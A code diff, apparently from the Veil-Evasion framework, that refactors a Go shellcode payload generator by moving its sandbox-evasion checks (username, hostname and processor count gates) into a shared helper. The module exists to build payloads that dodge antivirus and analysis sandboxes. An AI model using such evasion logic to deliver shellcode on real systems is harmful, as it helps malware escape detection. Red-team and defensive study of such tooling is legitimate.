@@ -10,6 +10,7 @@ Updated by @ChrisTruncer
 """
 
 from Tools.Evasion.evasion_common import evasion_helpers
+from Tools.Evasion.evasion_common import gamemaker
 from Tools.Evasion.evasion_common import shellcode_help
 
 
@@ -42,38 +43,6 @@ class PayloadModule:
             "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
             "USERNAME"       : ["X", "Optional: The required user account"]
         }
-
-    def system_checks(self):
-        rand_username = evasion_helpers.randomString()
-        rand_error1 = evasion_helpers.randomString()
-        rand_hostname = evasion_helpers.randomString()
-        rand_error2 = evasion_helpers.randomString()
-        rand_processor = evasion_helpers.randomString()
-        rand_domain = evasion_helpers.randomString()
-        rand_error3 = evasion_helpers.randomString()
-        num_ends = 0
-        check_code = ''
-
-        if self.required_options["USERNAME"][0].lower() != "x":
-            check_code += rand_username + ", " + rand_error1 + " := user.Current()\n"
-            check_code += "if " + rand_error1 + " != nil {\n"
-            check_code += "os.Exit(1)}\n"
-            check_code += "if strings.Contains(strings.ToLower(" + rand_username + ".Username), strings.ToLower(\"" + self.required_options["USERNAME"][0] + "\")) {\n"
-            num_ends += 1
-
-        if self.required_options["HOSTNAME"][0].lower() != "x":
-            check_code += rand_hostname + ", " + rand_error2 + " := os.Hostname()\n"
-            check_code += "if " + rand_error2 + " != nil {\n"
-            check_code += "os.Exit(1)}\n"
-            check_code += "if strings.Contains(strings.ToLower(" + rand_hostname + "), strings.ToLower(\"" + self.required_options["HOSTNAME"][0] + "\")) {\n"
-            num_ends += 1
-
-        if self.required_options["PROCESSORS"][0].lower() != "x":
-            check_code += rand_processor + " := runtime.NumCPU()\n"
-            check_code += "if " + rand_processor + " >= " + self.required_options["PROCESSORS"][0] + " {\n"
-            num_ends += 1
-
-        return check_code, num_ends
 
     def generate(self):
 
@@ -113,7 +82,7 @@ class PayloadModule:
             Shellcode = self.cli_shellcode
 
         # sandbox check code
-        sandbox_checks, num_curlys = self.system_checks()
+        sandbox_checks, num_curlys = gamemaker.senecas_games(self)
 
         payload_code = "package main\nimport (\n\"syscall\"\n\"unsafe\"\n\"fmt\"\n\"os\"\n"
         if self.required_options["PROCESSORS"][0].lower() != "x":
@@ -121,12 +90,10 @@ class PayloadModule:
 
         # Add in other imports based on checks being performed
         if self.required_options["USERNAME"][0].lower() != "x":
-            payload_code += "\"strings\"\n\"os\"\n\"os/user\"\n"
+            payload_code += "\"strings\"\n\"os/user\"\n"
         if self.required_options["HOSTNAME"][0].lower() != "x":
             if "strings" not in payload_code:
                 payload_code += "\"strings\"\n"
-            if "os" not in payload_code:
-                payload_code += "\"os\"\n"
 
         payload_code += ")\n"
 
